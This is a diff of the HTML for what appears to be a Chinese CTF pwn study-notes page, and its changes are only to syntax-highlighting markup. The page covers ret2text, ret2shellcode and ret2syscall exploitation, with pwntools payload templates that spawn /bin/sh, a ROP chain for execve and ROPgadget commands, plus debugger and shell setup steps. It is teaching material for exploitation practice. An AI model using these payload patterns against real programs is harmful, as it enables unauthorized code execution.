@@ -46,9 +46,9 @@
 &lt;/ul>
 &lt;h2 id="ret2text">ret2text&lt;/h2>
 &lt;p>在代码段.text存在后门函数，将ret address修改为后门函数的地址控制函数的执行&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
 &lt;p>存在rwx代码片段，传入shellcode并修改ret address为shellcode所在的缓冲区地址&lt;/p>
 &lt;p>NX不开启时直接写入栈缓冲区，开启时向bss缓冲区或堆缓冲区写入shellcode并使用mprotect赋予可执行权限&lt;/p>
 &lt;ul>
@@ -56,23 +56,23 @@
 &lt;p>&lt;a href="http://shell-storm.org/shellcode/">shellcode&lt;/a>&lt;/p>
 &lt;/li>
 &lt;li>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
-&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
-&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
-&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
-&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
 &lt;p>存在&lt;code>/bin/sh&lt;/code>或&lt;code>sh&lt;/code>字符串，构造gadgets多次跳转ret addr来执行&lt;code>execve&lt;/code>系统调用；gadgets通过&lt;code>ROPgadget&lt;/code>寻找&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
-ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
-ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过&lt;code>int 0x80&lt;/code>执行，amd64下为&lt;code>syscall&lt;/code>；注意参数传入的顺序 (1-&amp;gt;N) 与栈中存放的顺序 (N-&amp;gt;1)的区别&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#75715e"># 0xb: execve的系统调用号 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过&lt;code>int 0x80&lt;/code>执行，amd64下为&lt;code>syscall&lt;/code>；注意参数传入的顺序 (1-&amp;gt;N) 与栈中存放的顺序 (N-&amp;gt;1)的区别&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 0xb: execve的系统调用号 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
@@ -123,15 +123,15 @@ git clone https://github.com/pwndbg/pwndbg.git
 ./setup.sh
 &lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># 使用peda-heap
 git clone https://github.com/Mipu94/peda-heap.git
-echo &amp;quot;source ~/GDB-Plugins/peda-heap/peda.py&amp;quot; &amp;gt; ~/.gdbinit
+echo &amp;#34;source ~/GDB-Plugins/peda-heap/peda.py&amp;#34; &amp;gt; ~/.gdbinit
 # 使用peda
 git clone https://github.com/longld/peda.git
-echo &amp;quot;source ~/GDB-Plugins/peda/peda.py&amp;quot; &amp;gt; ~/.gdbinit
+echo &amp;#34;source ~/GDB-Plugins/peda/peda.py&amp;#34; &amp;gt; ~/.gdbinit
 # 使用gef
 git clone https://github.com/hugsy/gef.git
-echo &amp;quot;source ~/GDB-Plugins/gef/gef.py&amp;quot; &amp;gt; ~/.gdbinit
+echo &amp;#34;source ~/GDB-Plugins/gef/gef.py&amp;#34; &amp;gt; ~/.gdbinit
 # 使用pwndbg
-echo &amp;quot;source ~/GDB-Plugins/pwndbg/gdbinit.py&amp;quot; &amp;gt; ~/.gdbinit
+echo &amp;#34;source ~/GDB-Plugins/pwndbg/gdbinit.py&amp;#34; &amp;gt; ~/.gdbinit
 # 自动切换脚本 https://blog.csdn.net/aptx4869_li/article/details/81566541
 &lt;/code>&lt;/pre>&lt;p>安装one_gadget&lt;/p>
 &lt;pre tabindex="0">&lt;code>sudo apt-add-repository ppa:brightbox/ruby-ng
@@ -149,10 +149,10 @@ sudo apt-get install lib32z1
 &lt;pre tabindex="0">&lt;code>sudo gem install seccomp-tools
 &lt;/code>&lt;/pre>&lt;p>安装zshell&amp;amp;插件&lt;/p>
 &lt;pre tabindex="0">&lt;code>sudo apt-get install zsh
-sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&amp;quot;
+sh -c &amp;#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&amp;#34;
 # zsh-syntax-highlighting
 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
-echo &amp;quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&amp;quot; &amp;gt;&amp;gt; ${ZDOTDIR:-$HOME}/.zshrc
+echo &amp;#34;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&amp;#34; &amp;gt;&amp;gt; ${ZDOTDIR:-$HOME}/.zshrc
 source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
 # zsh-autosuggestions
 git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions
